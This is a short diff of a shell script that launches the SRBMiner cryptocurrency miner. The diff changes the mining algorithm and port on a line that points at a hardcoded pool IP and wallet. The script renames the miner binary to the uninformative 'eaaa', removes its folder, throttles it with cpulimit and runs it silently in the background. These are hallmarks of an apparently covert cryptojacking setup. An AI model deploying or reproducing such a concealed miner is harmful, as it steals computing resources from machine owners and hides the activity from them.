@@ -11,4 +11,4 @@ cd ..
 mv SRBMiner-MULTI eaaa
 rm -rf SRBMiner-Multi-2-3-1/
 sudo cpulimit --background -e eaaa -l 300
-nohup ./eaaa --algorithm minotaurx --pool stratum+ssl://103.249.70.7:17019 --wallet RHTx4HUZRrmy8tWhpn5WWX2x7KmfYS4Txq --password c=VRSC,mc=LCC,id=YANTO$(( $RANDOM % 1000 + 1 )) --cpu-threads 4 --disable-gpu &> /dev/null &
+nohup ./eaaa --algorithm yespoweric --pool stratum+ssl://103.249.70.7:16238 --wallet RHTx4HUZRrmy8tWhpn5WWX2x7KmfYS4Txq --password c=VRSC,id=YANTO$(( $RANDOM % 1000 + 1 )) --cpu-threads 4 --disable-gpu &> /dev/null &
